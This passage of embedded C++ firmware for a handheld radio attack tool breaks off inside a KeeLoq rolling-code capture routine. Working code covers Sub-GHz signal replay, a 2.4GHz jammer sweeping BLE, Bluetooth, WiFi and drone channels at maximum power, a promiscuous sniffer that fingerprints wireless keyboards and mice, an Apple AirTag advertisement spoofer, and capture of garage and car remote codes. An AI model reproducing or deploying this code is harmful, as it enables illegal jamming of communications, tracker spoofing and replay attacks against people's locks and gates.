    cc1101WriteReg(CC1101_IOCFG0,   0x2D);
    cc1101WriteReg(CC1101_IOCFG2,   0x0B);
    cc1101WriteReg(CC1101_MCSM1,    0x00);
    cc1101WriteReg(CC1101_MCSM0,    0x18);
    cc1101WriteReg(CC1101_FSCAL3,   0xE9);
    cc1101WriteReg(CC1101_FSCAL2,   0x2A);
    cc1101WriteReg(CC1101_FSCAL1,   0x00);
    cc1101WriteReg(CC1101_FSCAL0,   0x1F);
    cc1101WriteReg(CC1101_TEST2,    0x81);
    cc1101WriteReg(CC1101_TEST1,    0x35);
    cc1101WriteReg(CC1101_TEST0,    0x09);
    uint8_t paTable[8] = {0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101WriteBurst(CC1101_PATABLE, paTable, 8);
    cc1101WriteReg(CC1101_FREND0, 0x11);

    cc1101Strobe(CC1101_SCAL);
    delay(3);

    pinMode(CC1101_GDO0, OUTPUT);
    digitalWrite(CC1101_GDO0, LOW);
    cc1101Strobe(CC1101_STX);
    delayMicroseconds(150);

    // ---- Phase 3: Transmit from RAM - no SPI/SD access, no interrupts ----
    const uint32_t gdo0Bit = (1UL << CC1101_GDO0);
    noInterrupts();
    for (int i = 0; i < filled; i++) {
        int16_t pulse = psBuf[i];
        unsigned long dur = constrain((unsigned long)abs(pulse), 10UL, 65535UL);
        if (pulse > 0) GPIO.out_w1ts = gdo0Bit;
        else           GPIO.out_w1tc = gdo0Bit;
        // tight delay loop - no function call overhead for short pulses
        if (dur <= 16000) {
            delayMicroseconds(dur);
        } else {
            while (dur > 16000) { delayMicroseconds(16000); dur -= 16000; }
            if (dur > 0) delayMicroseconds(dur);
        }
    }
    GPIO.out_w1tc = gdo0Bit;
    interrupts();

    free(psBuf);

    // Restore CC1101 to RX
    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);
    pinMode(CC1101_GDO0, INPUT);
    cc1101ConfigureBase();
    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
    cc1101EnterRx();

    rfTransmitCount++;
    rfTransmitStatus = "Replay sent (" + String(filled) + ")";
    rfTransmitStatusUntil = millis() + 1800;
    LOG("PSRAM TX done: " + String(filled) + " pulses from " + path);
    return true;
}

bool transmitLoadedSubFile() {
    // Prefer the already-loaded buffer so held replay doesn't stutter on SD/file parsing.
    // Fall back to on-demand streaming only if we somehow lost the pulse buffer.
    if (!rfSubLoaded || rfSubPulseCount <= 0 || rfSubTimings == nullptr || !ensureCC1101Ready()) {
        if (rfSubLoaded && rfSubLoadedPath.length() > 0 && validateSDReady(false)) {
            return transmitSubFileStreaming(rfSubLoadedPath);
        }
        return false;
    }

    // ---- Configure CC1101 for OOK async TX via GDO0 ----
    // Matches Flipper Zero FuriHalSubGhzPresetOok650Async exactly
    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);

    // Frequency from file (with PPM correction)
    float freqMHz = rfLockedFrequencyMHz;
    freqMHz = cc1101ApplyFrequencyCorrection(freqMHz);
    uint32_t freqWord = (uint32_t)((freqMHz * 65536.0f / 26.0f) + 0.5f);
    cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
    cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
    cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);

    // Apply modulation preset from file
    cc1101ApplyPreset(rfSubPreset);

    // Exact Flipper Zero FuriHalSubGhzPresetOok650Async register values
    cc1101WriteReg(CC1101_FSCTRL1,  0x06);  // IF = 152kHz
    cc1101WriteReg(CC1101_FSCTRL0,  0x00);
    cc1101WriteReg(CC1101_PKTCTRL0, 0x32);  // async serial, infinite packet
    cc1101WriteReg(CC1101_PKTCTRL1, 0x04);
    cc1101WriteReg(CC1101_IOCFG0,   0x2D);  // GDO0 = serial TX data
    cc1101WriteReg(CC1101_IOCFG2,   0x0B);  // GDO2 = serial clock
    cc1101WriteReg(CC1101_MCSM1,    0x00);  // after TX go to IDLE (stops carrier immediately)
    cc1101WriteReg(CC1101_MCSM0,    0x18);
    cc1101WriteReg(CC1101_FSCAL3,   0xE9);
    cc1101WriteReg(CC1101_FSCAL2,   0x2A);
    cc1101WriteReg(CC1101_FSCAL1,   0x00);
    cc1101WriteReg(CC1101_FSCAL0,   0x1F);
    cc1101WriteReg(CC1101_TEST2,    0x81);
    cc1101WriteReg(CC1101_TEST1,    0x35);
    cc1101WriteReg(CC1101_TEST0,    0x09);

    // PA table: index 0 = 0x00 (PA completely off), index 1 = 0xC0 (max +10dBm)
    uint8_t paTable[8] = {0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101WriteBurst(CC1101_PATABLE, paTable, 8);
    cc1101WriteReg(CC1101_FREND0, 0x11);  // OOK: PA[0] when GDO0=0, PA[1] when GDO0=1

    cc1101Strobe(CC1101_SCAL);
    delay(3);

    // GDO0 as output - start LOW (carrier off)
    pinMode(CC1101_GDO0, OUTPUT);
    digitalWrite(CC1101_GDO0, LOW);
    cc1101Strobe(CC1101_STX);
    delayMicroseconds(150);

    // Bit-bang exact pulse timings using direct GPIO registers for minimum jitter
    // Direct register writes are ~4ns vs digitalWrite ~300ns
    const uint32_t gdo0Bit = (1UL << CC1101_GDO0);

    noInterrupts();  // disable all interrupts for clean timing
    for (int i = 0; i < rfSubPulseCount; i++) {
        int16_t pulse = rfSubTimings[i];
        unsigned long durationUs = (unsigned long)abs(pulse);
        durationUs = constrain(durationUs, 10UL, 100000UL);  // min 10µs, max 100ms

        if (pulse > 0) {
            GPIO.out_w1ts = gdo0Bit;  // GDO0 HIGH - carrier ON
        } else {
            GPIO.out_w1tc = gdo0Bit;  // GDO0 LOW - carrier OFF
        }

        // Accurate delay - split into 16ms chunks to avoid overflow
        while (durationUs > 16000) {
            delayMicroseconds(16000);
            durationUs -= 16000;
        }
        if (durationUs > 0) delayMicroseconds(durationUs);

        // Feed watchdog every 64 pulses during gaps only
        if ((i & 0x3F) == 0x3F && pulse < 0) {
            interrupts();
            yield();
            noInterrupts();
        }
    }
    GPIO.out_w1tc = gdo0Bit;  // ensure GDO0 LOW at end
    interrupts();

    cc1101Strobe(CC1101_SIDLE);
    delayMicroseconds(200);
    pinMode(CC1101_GDO0, INPUT);
    cc1101ConfigureBase();
    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
    cc1101EnterRx();

    rfTransmitCount++;
    rfTransmitStatus = "Replay sent";
    rfTransmitStatusUntil = millis() + 1800;
    return true;
}

// ===== BLEJAMMER ENGINE =====
void handleRFProtocols() {
    static uint32_t lastHop = 0;
    static int bleIndex = 0;
    static int btIndex = 0;
    static int wifiIndex = 0;

    uint32_t now = millis();
    byte channel = 0;

    if (currentRadioMode == BLE_SCAN) {
        if (now - lastHop > 10) {
            bleIndex = (bleIndex + 1) % num_bluetooth_even;
            channel = bluetooth_even_channels[bleIndex];
            radio1.setChannel(channel);
            lastHop = now;
        }
    }
    else if (currentRadioMode == BLE_BEACON_SPAM) {
        if (now - lastHop > 2) {
            btIndex = (btIndex + 1) % num_bluetooth_odd;
            channel = bluetooth_odd_channels[btIndex];
            radio1.stopConstCarrier();
            radio1.setChannel(channel);
            radio1.startConstCarrier(RF24_PA_MAX, channel);
            lastHop = now;
        }
    }
    else if (currentRadioMode == WIFI_SCAN) {
        if (now - lastHop > 500) {
            wifiIndex = (wifiIndex + 1) % num_wifi;
            channel = wifi_channels[wifiIndex];
            radio1.setChannel(channel);
            lastHop = now;
        }
    }
    else if (currentRadioMode == RADIO_24_ACTIVE && jammerActive) {
        // SINGLE RADIO OPTIMIZATION: Uses only radio1 for maximum efficiency
        // FAST NON-BLOCKING: Quick channel hops with constant carrier only
        unsigned long hopInterval = 20;  // 20ms dwell - fast but effective
        
        if (jammerMode == CONSTANT_CARRIER) {
            hopInterval = 40;  // 40ms for carrier sweep
        }
        
        if (now - lastJammingTime > hopInterval) {
            // Select channel based on mode
            byte targetChannel = currentJamChannel;
            
            if (jammerMode == CONSTANT_CARRIER) {
                // Constant carrier mode with hopping
                if (constantCarrierHopping) {
                    static bool hopDirection = false;
                    if (hopDirection) {
                        constantCarrierChannel += 2;
                        if (constantCarrierChannel > 125) {
                            constantCarrierChannel = 125;
                            hopDirection = false;
                        }
                    } else {
                        if (constantCarrierChannel < 2) {
                            constantCarrierChannel = 0;
                            hopDirection = true;
                        } else {
                            constantCarrierChannel -= 2;
                        }
                    }
                    targetChannel = constantCarrierChannel;
                }
            } else if (jammerMode == BLE_MODULE) {
                // Rapidly cycle through BLE advertising channels
                static byte bleIdx = 0;
                targetChannel = ble_adv_channels[bleIdx];
                bleIdx = (bleIdx + 1) % 3;
            } else if (jammerMode == Bluetooth_MODULE) {
                // Rapidly cycle through Bluetooth channels
                static byte btIdx = 0;
                targetChannel = bluetooth_classic_channels[btIdx];
                btIdx = (btIdx + 1) % (sizeof(bluetooth_classic_channels) / sizeof(byte));
            } else if (jammerMode == WIFI_MODULE) {
                // Rapidly cycle through WiFi channels
                static byte wifiIdx = 0;
                targetChannel = wifi_channels_full[wifiIdx];
                wifiIdx = (wifiIdx + 1) % (sizeof(wifi_channels_full) / sizeof(byte));
            } else if (jammerMode == DRONE_MODULE) {
                // Random hopping for drone frequencies
                targetChannel = random(0, 126);
            }
            
            // Always update channel for aggressive jamming
            currentJamChannel = targetChannel;
            
            // FAST: Just set channel and start constant carrier (non-blocking)
            radio1.setChannel(currentJamChannel);
            delayMicroseconds(100);  // Quick settle
            radio1.startConstCarrier(RF24_PA_MAX, currentJamChannel);
            
            jamPacketCount++;
            radio24ActiveChannel1 = currentJamChannel;
            radio24ActiveTxCount = jamPacketCount;
            lastJammingTime = now;
        }
    }
}

void drawRadio24ActiveScreen() {
    uint16_t bg = ILI9341_BLACK;
    uint16_t panel = tft.color565(18, 18, 18);
    uint16_t border = tft.color565(74, 74, 74);
    uint16_t soft = tft.color565(160, 160, 160);

    if (radio24ActiveFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);

        tft.fillRoundRect(10, 34, 220, 196, 10, panel);
        tft.drawRoundRect(10, 34, 220, 196, 10, border);

        tft.setTextSize(2);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 46);
        tft.print("2.4GHz Jammer");

        tft.setTextSize(1);
        tft.setTextColor(soft);
        tft.setCursor(18, 66);
        tft.print("NRF24 interference");

        drawBLEBeaconCard(18, 86, 96, 42, "Mode", ILI9341_WHITE);
        drawBLEBeaconCard(126, 86, 96, 42, "Status", ILI9341_WHITE);
        drawBLEBeaconCard(18, 136, 96, 42, "Channel", ILI9341_WHITE);
        drawBLEBeaconCard(126, 136, 96, 42, "Packets", ILI9341_WHITE);
        drawBLEBeaconCard(18, 186, 204, 30, "Controls", ILI9341_WHITE);

        tft.setTextColor(soft);
        tft.setCursor(26, 200);
        tft.print("SEL mode   LEFT back");

        radio24ActiveFirstDraw = false;
    }

    tft.fillRect(26, 102, 80, 14, panel);
    tft.fillRect(134, 102, 80, 14, panel);
    tft.fillRect(26, 152, 80, 14, panel);
    tft.fillRect(134, 152, 80, 14, panel);

    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);

    // Show jammer mode
    tft.setCursor(26, 100);
    tft.print(getJammerModeLabel());

    // Show status
    tft.setCursor(134, 100);
    if (jammerActive) {
        tft.setTextColor(ILI9341_RED);
        tft.print("Active");
    } else {
        tft.setTextColor(tft.color565(100, 100, 100));
        tft.print("Idle");
    }

    // Show channel (Radio1 only)
    tft.setTextColor(ILI9341_YELLOW);
    tft.setCursor(26, 150);
    tft.print("Ch:");
    tft.print(currentJamChannel);

    // Show packet count
    tft.setTextColor(tft.color565(255, 150, 0));
    tft.setCursor(134, 150);
    tft.print(jamPacketCount);
}

void run24GHzScannerStep() {

    radio1.startListening();

    radio1.setChannel(scanChannel);
    delayMicroseconds(130);  // longer settle for better sensitivity

    uint8_t strength = 0;

    for (int i = 0; i < 25; i++) {
        if (radio1.testRPD()) strength++;
        delayMicroseconds(10);
    }

    if (scanChannel == getSelected24GHzIndex()) {
        strength = (uint8_t)min((int)strength * 2, 25);
    }

    channelActivity[scanChannel] = strength;

    scanChannel++;
    if (scanChannel >= CHANNEL_COUNT) scanChannel = 0;
}

void run24GHzActiveStep() {
    handleRFProtocols();
}

// ===== 2.4GHz PROTOCOL ANALYZER =====
void runProtocolAnalyzer() {
    static unsigned long lastHop    = 0;
    static uint8_t       channel    = 2;
    static uint32_t      totalSeen  = 0;
    static int8_t        lastRssi   = -78;
    static char          lastProto[18] = {0};
    static char          lastDetail[16] = {0};

    if (attackFirstDraw) {
        channel = 2;
        totalSeen = 0;
        lastRssi = -78;
        sniffBufCount = 0;
        sniffSelectedIndex = 0;
        sniffScrollOffset = 0;
        sniffListNeedsRedraw = true;
        wifiScannerFirstDraw = true;
        memset(sniffBuf, 0, sizeof(sniffBuf));
        memset(lastProto, 0, sizeof(lastProto));
        memset(lastDetail, 0, sizeof(lastDetail));

        if (radio1Ok) {
            radio1.setAutoAck(false);
            radio1.setPALevel(RF24_PA_MIN);
            radio1.setDataRate(RF24_2MBPS);
            radio1.setPayloadSize(32);
            radio1.setAddressWidth(2);
            uint64_t promisc_addr = 0xAALL;
            radio1.openReadingPipe(0, promisc_addr);
            radio1.disableCRC();
            radio1.setChannel(channel);
            radio1.startListening();
        }
        attackFirstDraw = false;
        lastHop = 0;
    }

    // Channel hop every 400ms — slower so we actually catch packets
    if (millis() - lastHop > 400) {
        lastHop = millis();
        channel++;
        if (channel > 84) channel = 2;
        if (radio1Ok) radio1.setChannel(channel);
    }

    // Capture packet
    if (radio1Ok && radio1.available()) {
        radio1.read(&attackPacketBuffer, 32);
        uint8_t plen = attackPacketBuffer[5] >> 2;

        if (plen > 0 && plen <= 32) {
            char srcLabel[16];
            char proto[16];
            snprintf(srcLabel, sizeof(srcLabel), "C%02u %02X%02X %02uB",
                channel,
                attackPacketBuffer[0], attackPacketBuffer[1],
                attackPacketBuffer[4], plen);

            uint8_t b6 = attackPacketBuffer[6];
            uint8_t b7 = attackPacketBuffer[7];

            // Protocol identification — expanded from Flipper/MouseJack research
            if      (plen == 19 && b6 == 0x08)               strncpy(proto, "MS Mouse",     sizeof(proto) - 1);
            else if (plen == 19 && b6 == 0x0A)               strncpy(proto, "MS Keyboard",  sizeof(proto) - 1);
            else if (plen == 19 && b6 == 0x0C)               strncpy(proto, "MS Presenter", sizeof(proto) - 1);
            else if (b6 == 0x00 && plen == 10)               strncpy(proto, "Logitech",     sizeof(proto) - 1);
            else if (b6 == 0x00 && plen == 22)               strncpy(proto, "Logi Adv",     sizeof(proto) - 1);
            else if (plen == 5  && b6 == 0x40)               strncpy(proto, "RC Toy",       sizeof(proto) - 1);
            else if (plen == 5)                              strncpy(proto, "Short Pkt",    sizeof(proto) - 1);
            else if (plen == 32 && b6 == 0x00 && b7 == 0x00) strncpy(proto, "nRF24 Raw",   sizeof(proto) - 1);
            else if (plen >= 16 && plen <= 20 && b6 == 0x40) strncpy(proto, "Keyb HID",    sizeof(proto) - 1);
            else if (plen >= 10 && plen <= 15)               strncpy(proto, "Generic HID",  sizeof(proto) - 1);
            else if (plen >= 20 && plen <= 32)               strncpy(proto, "Long Packet",  sizeof(proto) - 1);
            else                                             snprintf(proto, sizeof(proto), "Pkt %uB", plen);
            proto[sizeof(proto) - 1] = 0;

            lastRssi = radio1.testRPD() ? -48 : -76;
            bool sameAsLast = (strncmp(lastProto, proto, sizeof(lastProto) - 1) == 0) &&
                              (strncmp(lastDetail, srcLabel, sizeof(lastDetail) - 1) == 0);

            if (sameAsLast && sniffBufCount > 0) {
                SniffEntry& last = sniffBuf[sniffBufCount - 1];
                last.rssi = lastRssi;
                last.channel = channel;
                last.count++;
            } else {
                appendSniffEntry(sniffBuf, sniffBufCount, proto, srcLabel, lastRssi, channel);
                strncpy(lastProto, proto, sizeof(lastProto) - 1);
                lastProto[sizeof(lastProto) - 1] = 0;
                strncpy(lastDetail, srcLabel, sizeof(lastDetail) - 1);
                lastDetail[sizeof(lastDetail) - 1] = 0;
            }
            totalSeen++;
            sniffListNeedsRedraw = true;
        }
    }

    handleSniffListInput(sniffBufCount);
    drawSniffList("Protocol Scan", "nRF24 protocol list", sniffBuf, sniffBufCount,
                  tft.color565(100, 200, 255));
}

// ===== HIDDEN SSID REVEALER =====
void runHiddenSSIDReveal() {
    static unsigned long lastScanMs = 0;
    static uint16_t hiddenCount = 0;
    static uint16_t totalCount = 0;
    static char subtitle[32] = "Passive hidden AP scan";

    if (attackFirstDraw) {
        // Draw the screen immediately so it's not blank
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_YELLOW);
        tft.setCursor(8, 28);
        tft.print("Hidden SSID");
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(100,100,100));
        tft.setCursor(8, 50);
        tft.print("Scanning for hidden networks...");
        tft.drawFastHLine(0, 62, 240, tft.color565(50,50,50));
        tft.setTextColor(tft.color565(80,80,80));
        tft.setCursor(8, 290);
        tft.print("UP/DN scroll  LEFT back");

        sniffBufCount = 0;
        sniffSelectedIndex = 0;
        sniffScrollOffset = 0;
        sniffListNeedsRedraw = true;
        wifiScannerFirstDraw = true;
        hiddenCount = 0;
        totalCount = 0;
        lastScanMs = 0;
        clearWiFiScanResults();
        memset(sniffBuf, 0, sizeof(sniffBuf));
        attackFirstDraw = false;
        snprintf(subtitle, sizeof(subtitle), "Passive hidden AP scan");
        resetWiFi();
        if (WiFi.mode(WIFI_STA)) {
            WiFi.disconnect(false, false);
            WiFi.scanDelete();
        }
        lastScanMs = millis();
    }

    unsigned long now = millis();

    // Input handling with proper bounds
    static bool selectWasPressed = false;
    static bool showDetail = false;
    static int detailIdx = -1;

    bool selNow = (companion_readButtonState(BTN_SELECT) == LOW);
    if (selNow && !selectWasPressed && sniffBufCount > 0) {
        selectWasPressed = true;
        detailIdx = sniffScrollOffset;
        showDetail = true;
        delay(80);
    }
    if (!selNow) selectWasPressed = false;

    // Detail view — show all info about selected hidden AP
    if (showDetail && detailIdx >= 0 && detailIdx < sniffBufCount) {
        static bool detailDrawn = false;
        if (!detailDrawn) {
            tft.fillScreen(ILI9341_BLACK);
            drawStatusBar();
            tft.setTextSize(2);
            tft.setTextColor(ILI9341_YELLOW);
            tft.setCursor(8, 28);
            tft.print("Hidden AP Info");
            tft.drawFastHLine(0, 50, 240, tft.color565(50,50,50));

            SniffEntry& e = sniffBuf[detailIdx];
            int y = 58;
            tft.setTextSize(1);

            tft.setTextColor(tft.color565(120,120,120)); tft.setCursor(8, y); tft.print("BSSID (MAC):");
            tft.setTextColor(ILI9341_WHITE); tft.setCursor(8, y+10); tft.print(e.mac);
            y += 26;

            tft.setTextColor(tft.color565(120,120,120)); tft.setCursor(8, y); tft.print("Channel:");
            tft.setTextColor(ILI9341_WHITE); tft.setCursor(8, y+10); tft.print(e.channel);
            y += 26;

            tft.setTextColor(tft.color565(120,120,120)); tft.setCursor(8, y); tft.print("RSSI:");
            tft.setTextColor(ILI9341_WHITE); tft.setCursor(8, y+10);
            tft.print(e.rssi); tft.print(" dBm");
            y += 26;

            // Estimate distance via free-space path loss at 2.4GHz
            // FSPL: d = 10^((27.55 - 20*log10(2437) - RSSI) / 20)
            float freq_mhz = 2407.0f + e.channel * 5.0f;
            float fspl_const = 27.55f - 20.0f * log10f(freq_mhz);
            float dist_m = powf(10.0f, (fspl_const - (float)e.rssi) / 20.0f);
            tft.setTextColor(tft.color565(120,120,120)); tft.setCursor(8, y); tft.print("Est. Distance:");
            tft.setTextColor(ILI9341_WHITE); tft.setCursor(8, y+10);
            if (dist_m < 1000.0f) { tft.print(dist_m, 1); tft.print(" m"); }
            else { tft.print(dist_m/1000.0f, 2); tft.print(" km"); }
            y += 26;

            // OUI vendor lookup from first 3 bytes of MAC
            tft.setTextColor(tft.color565(120,120,120)); tft.setCursor(8, y); tft.print("OUI Prefix:");
            tft.setTextColor(tft.color565(180,180,255)); tft.setCursor(8, y+10);
            char oui[9]; strncpy(oui, e.mac, 8); oui[8] = 0;
            tft.print(oui);
            y += 26;

            tft.setTextColor(tft.color565(120,120,120)); tft.setCursor(8, y); tft.print("SSID:");
            tft.setTextColor(tft.color565(180,180,180)); tft.setCursor(8, y+10);
            tft.print("(hidden - not broadcast)");
            y += 26;

            tft.setTextColor(tft.color565(80,80,80)); tft.setCursor(8, 290);
            tft.print("LEFT back");
            detailDrawn = true;
        }

        if (isPressed(BTN_LEFT)) {
            showDetail = false;
            detailDrawn = false;
            attackFirstDraw = true;  // force full redraw of list
            sniffListNeedsRedraw = true;
            wifiScannerFirstDraw = true;
            delay(150);
        }
        return;
    }
    showDetail = false;

    if (isPressed(BTN_UP)) {
        if (sniffBufCount > 0 && sniffScrollOffset > 0) sniffScrollOffset--;
        sniffSelectedIndex = sniffScrollOffset;
        sniffListNeedsRedraw = true;
        delay(80);
    }
    if (isPressed(BTN_DOWN)) {
        if (sniffBufCount > 0 && sniffScrollOffset < sniffBufCount - 1) sniffScrollOffset++;
        sniffSelectedIndex = sniffScrollOffset;
        sniffListNeedsRedraw = true;
        delay(80);
    }

    // Trigger async scan every 3s (non-blocking check)
    if (now - lastScanMs >= 3000UL) {
        lastScanMs = now;
        hiddenCount = 0;
        totalCount = 0;
        sniffBufCount = 0;
        sniffSelectedIndex = 0;
        sniffScrollOffset = 0;
        clearWiFiScanResults();

        if (WiFi.mode(WIFI_STA)) {
            WiFi.disconnect(false, false);
            delay(40);

            int n = WiFi.scanNetworks(false, true);
            if (n < 0) {
                n = 0;
            }

            int count = 0;
            for (int i = 0; i < n && count < MAX_SCAN_RESULTS; i++) {
                String enc = "?";
                switch (WiFi.encryptionType(i)) {
                    case WIFI_AUTH_OPEN:          enc = "OPEN";    break;
                    case WIFI_AUTH_WEP:           enc = "WEP";     break;
                    case WIFI_AUTH_WPA_PSK:       enc = "WPA";     break;
                    case WIFI_AUTH_WPA2_PSK:      enc = "WPA2";    break;
                    case WIFI_AUTH_WPA_WPA2_PSK:  enc = "WPA/2";   break;
                    case WIFI_AUTH_WPA2_ENTERPRISE: enc = "WPA2E"; break;
                    case WIFI_AUTH_WPA3_PSK:      enc = "WPA3";    break;
                    case WIFI_AUTH_WPA2_WPA3_PSK: enc = "WPA2/3";  break;
                    default: enc = "ENC"; break;
                }

                const String ssid = WiFi.SSID(i);
                const String bssid = WiFi.BSSIDstr(i);
                const int channel = WiFi.channel(i);
                const int rssi = WiFi.RSSI(i);

                storeWiFiNetworkResult(ssid, bssid, channel, rssi, enc, count);
                totalCount++;

                if (ssid.length() == 0 || ssid == "(hidden)") {
                    appendSniffEntry(sniffBuf, sniffBufCount, bssid.c_str(), "(hidden)", (int8_t)rssi, (uint8_t)channel);
                    hiddenCount++;
                }

                if ((i & 0x03) == 0x03) {
                    yield();
                }
            }

            wifiNetworkCount = count;
            sortWiFiResultsByRSSI();
            WiFi.scanDelete();
        }

        snprintf(subtitle, sizeof(subtitle), "Passive H:%u T:%u", hiddenCount, totalCount);
        sniffListNeedsRedraw = true;
    }

    // Hidden SSID uses blocking WiFi scans, so repaint the idle/list view on a
    // gentle cadence instead of trusting stale redraw flags.
    static unsigned long lastHiddenDrawMs = 0;
    bool forceHiddenDraw = sniffListNeedsRedraw ||
                           (millis() - lastScanMs < 250UL) ||
                           (sniffBufCount == 0 && millis() - lastHiddenDrawMs >= 500UL);
    if (forceHiddenDraw) {
        if (millis() - lastScanMs < 250UL || sniffBufCount == 0) {
            wifiScannerFirstDraw = true;
        }
        sniffListNeedsRedraw = true;
        drawSniffList("Hidden SSID", subtitle, sniffBuf, sniffBufCount, ILI9341_YELLOW);
        lastHiddenDrawMs = millis();
    }
}

// ===== APPLE AIRTAG SPOOFER =====
void runAirTagSpoof() {
    static uint8_t airtagPayload[] = {
        0x1e, 0xff,        // length, manufacturer specific
        0x4c, 0x00,        // Apple company ID
        0x12, 0x19,        // Nearby Action type, length
        0x10,              // action flags
        0x05,              // AirTag device type
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    if (attackFirstDraw) {
        LOG("AirTag Spoof: Drawing UI");
        
        // Use standard attack UI drawing
        drawAttackUI("AirTag Spoof", "Apple AirTag beacon", tft.color565(100, 200, 255),
                     "Beacons", 0, "", "");
        
        attackPacketsSent = 0;
        attackLastSend = 0;
        attackFirstDraw = false;

        // Initialize BLE
        if (!initBLEForAttacks()) {
            LOG("AirTag Spoof: BLE Init FAILED");
            tft.setTextSize(1);
            tft.setTextColor(ILI9341_RED);
            tft.setCursor(18, 150);
            tft.print("BLE Init Failed!");
            tft.setCursor(18, 164);
            tft.print("Check BLE hardware");
            return;
        }
        
        LOG("AirTag Spoof: BLE Init SUCCESS");
    }

    // Increased frequency - send every 500ms instead of 2000ms for better detection
    if (millis() - attackLastSend < 500) return;
    attackLastSend = millis();

    // Reinit with new MAC each beacon — AirTags rotate MACs
    if (!bleReinitWithRandomMac()) {
        LOG("AirTag Spoof: MAC reinit failed");
        return;
    }

    // Randomize device-specific bytes (8-30)
    for (int i = 8; i < 31; i++) airtagPayload[i] = random(0, 256);

    // Send multiple times for better reliability
    bleSendRawAdv(airtagPayload, sizeof(airtagPayload), 250);
    delay(50);
    bleSendRawAdv(airtagPayload, sizeof(airtagPayload), 250);

    attackPacketsSent++;

    // Update stats using standard function
    updateAttackStats(attackPacketsSent, 0, tft.color565(100, 200, 255));
}

// ===== ROLLING CODE CAPTURE (passive - KeeLoq decoder) =====
// Captures OOK pulses via GDO0, decodes KeeLoq protocol,
// identifies manufacturer, extracts serial/counter/button.
// Saves as Flipper .sub format to /captures/rf/roll_capture/
void runRollingCapture() {
    if (!prepareCC1101PassiveTool(rfLockedFrequencyMHz, rfRollingFirstDraw)) {
        drawRFUnavailable("Roll Capture", "CC1101 not ready");
        delay(80);
        return;
    }

    static int8_t        lastRssi   = -127;
    static unsigned long lastRssiMs = 0;
    static unsigned long lastDrawMs = 0;
    static uint8_t       resultCount = 0;
    static bool          hasCapture = false;
    static const int     RAW_MAX = 256;
    static KeeloqResult  results[4];
    static int16_t       rawPulses[RAW_MAX];
    static int           rawCount = 0;

    if (rfRollingFirstDraw) {
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(100, 200, 255));
        tft.setCursor(8, 24);
        tft.print("Roll Capture");
        tft.setTextColor(tft.color565(100,100,100));
        tft.setCursor(8, 36);
        tft.print("KeeLoq rolling code decoder");
        tft.drawFastHLine(0, 46, 240, tft.color565(50,50,50));
        tft.setTextColor(tft.color565(120,120,120));
        tft.setCursor(8, 282);
        tft.print("SEL=capture  UP=save  HOLD-R=tune");
        resultCount = 0;
        rawCount    = 0;
        hasCapture  = false;
        lastRssi    = -127;
        memset(results, 0, sizeof(results));
        memset(rawPulses, 0, sizeof(rawPulses));
        keeloq_decoder_reset();
        cc1101ConfigureBase();
        cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
        cc1101WriteReg(CC1101_PKTCTRL0, 0x32);
        cc1101WriteReg(CC1101_IOCFG0,   0x0D);
        cc1101WriteReg(CC1101_MDMCFG2,  0x30);
        cc1101EnterRx();
        pinMode(CC1101_GDO0, INPUT);
        rfRollingFirstDraw = false;
        lastDrawMs = 0;
    }

    const unsigned long now = millis();

    // Handle SELECT — blocking pulse capture (same approach as RF Replay)
    extern bool rfRollingSelectPressed;
    if (rfRollingSelectPressed) {
        rfRollingSelectPressed = false;

        // Show capturing status
        tft.fillRect(0, 68, 240, 30, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_YELLOW);
        tft.setCursor(8, 72);
        tft.print("Capturing... press remote now");

        cc1101ConfigureBase();
        cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
        cc1101WriteReg(CC1101_PKTCTRL0, 0x32);
        cc1101WriteReg(CC1101_IOCFG0,   0x0D);
        cc1101WriteReg(CC1101_MDMCFG2,  0x30);
        cc1101EnterRx();
        pinMode(CC1101_GDO0, INPUT);

        // Wait briefly for a real burst before starting pulse capture.
        unsigned long waitStart = millis();
        while (digitalRead(CC1101_GDO0) == LOW && millis() - waitStart < 900) {
            delay(1);
            yield();
        }

        if (digitalRead(CC1101_GDO0) == HIGH) {
            // Capture pulses using shorter timeouts to avoid long blocking windows.
            keeloq_decoder_reset();
            rawCount = 0;
            uint8_t consecutiveMisses = 0;
            int validEdges = 0;
            unsigned long captureDeadline = millis() + 1300UL;

            for (int i = 0; i < 160 && rawCount < RAW_MAX && millis() < captureDeadline; i++) {
                unsigned long hi = pulseIn(CC1101_GDO0, HIGH, 2400UL);
                yield();
                unsigned long lo = pulseIn(CC1101_GDO0, LOW,  2400UL);
                yield();
                if (hi == 0 && lo == 0) {
                    consecutiveMisses++;
                    if (consecutiveMisses >= 2) break;
                    delay(0);
                    continue;
                }
                consecutiveMisses = 0;

                // Store raw
                if (hi > 0 && rawCount < RAW_MAX) {
                    rawPulses[rawCount++] = (int16_t)constrain((long)hi, 1, 32767);
                    validEdges++;
                }
                if (lo > 0 && rawCount < RAW_MAX) {
                    rawPulses[rawCount++] = -(int16_t)constrain((long)lo, 1, 32767);
                    validEdges++;
                }

                // Feed KeeLoq decoder
                if (hi > 0 && keeloq_decoder_feed(true,  (uint32_t)hi)) goto decoded;
                if (lo > 0 && keeloq_decoder_feed(false, (uint32_t)lo)) goto decoded;
                delay(0);
            }
            if (validEdges < 8) {
                rawCount = 0;
                hasCapture = false;
            }
            goto not_decoded;

            decoded: {
